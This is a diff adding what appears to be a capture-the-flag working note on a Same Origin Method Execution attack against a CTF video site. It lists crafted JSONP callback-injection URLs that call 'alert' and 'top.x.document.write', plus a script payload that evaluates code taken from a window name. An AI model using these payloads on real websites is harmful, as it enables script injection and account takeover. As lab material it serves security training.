@@ -1,0 +1,23 @@
+Same Origin Method Execution (SOME)
+
+https://somevideos.appsecil.ctf.today/videos/embed?id=a5ba7665-61a7-4461-9884-7567c07cbacd&callback=loadVideo
+	loadVideo({"success":true,"data":{"title":"Big Buk Bunny","description":"A&#x20;large&#x20;and&#x20;lovable&#x20;rabbit&#x20;deals&#x20;with&#x20;three&#x20;tiny&#x20;bullies,&#x20;led&#x20;by&#x20;a&#x20;flying&#x20;squirrel,&#x20;who&#x20;are&#x20;determined&#x20;to&#x20;squelch&#x20;his&#x20;happiness.","source":"https://test-videos.co.uk/vids/bigbuckbunny/mp4/h264/1080/Big_Buck_Bunny_1080_10s_20MB.mp4"}});
+
+https://somevideos.appsecil.ctf.today/videos/embed?id=a5ba7665-61a7-4461-9884-7567c07cbacd%26callback=alert%23#debug
+
+https://somevideos.appsecil.ctf.today/videos/view?id=a5ba7665-61a7-4461-9884-7567c07cbacd%26callback=top.x.document.write%23#debug
+
+https://test-videos.co.uk/vids/bigbuckbunny/mp4/h264/1080/Big_Buck_Bunny_1080_10s_20MB.mp4
+
+Titles:
+<script>/*
+*/eval(/*
+*/top[1]/*
+*/.name)//
+</script>
+
+8c0408e7-04c5-431a-bc7c-b99dd188ddf3
+25d979c6-8962-473e-aa4f-4a03af2df489
+209b8396-eb53-45f6-8d17-6697bbea4182
+03094b65-1060-426e-8902-9fb423f2489a
+adeec907-2242-40e4-85b8-641871e62b37
